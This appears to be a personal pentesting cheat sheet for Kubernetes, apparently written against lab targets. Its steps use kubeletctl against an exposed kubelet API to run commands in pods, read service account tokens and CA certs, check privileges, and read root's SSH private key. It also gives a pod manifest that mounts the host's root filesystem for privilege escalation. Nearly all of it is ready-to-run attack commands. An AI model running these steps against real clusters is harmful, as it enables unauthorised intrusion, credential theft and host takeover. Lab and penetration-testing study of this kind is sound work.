# kubectl
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

chmod +x kubectl
```

# kubeletctl
```bash
wget https://github.com/cyberark/kubeletctl/releases/download/v1.6/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
mv kubeletctl_linux_amd64 kubeletctl

./kubeletctl --server 10.129.47.153 pods

# list available commands
./kubeletctl --server 10.129.47.153 scan rce

 # run command
./kubeletctl -i --server 10.129.47.153 exec "id" -p nginx -c nginx

# extract token
./kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

# extract cert
./kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

# list privilleges
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

# extracting root ssh key
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

# Token 
```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.47.153:8443 get pods


kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.47.153:8443 auth can-i --list

```
## Get pods
```bash
curl https://10.129.10.11:10250/pods -k | jq .
```
## Create a new pod
f.yml:
```yaml
apiVersion: v1
kind: Pod
metadata:
	name: nginxt
	namespace: default
spec:
	containers:
	- name: nginxt
		image: nginx:1.14.2
		volumeMounts:
		- mountPath: /root
			name: mount-root-into-mnt
	volumes:
	- name: mount-root-into-mnt
		hostPath:
			path: /
	automountServiceAccountToken: true
	hostNetwork: true
```
```bash
./kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.47.153:8443 apply -f f.yml 
```

# Ports

| **Service**             | **TCP Ports**  |
| ----------------------- | -------------- |
| `etcd`                  | `2379`, `2380` |
| `API server`            | `6443`         |
| `Scheduler`             | `10251`        |
| `Controller Manager`    | `10252`        |
| `Kubelet API`           | `10250`        |
| `Read-Only Kubelet API` | `10255`        |

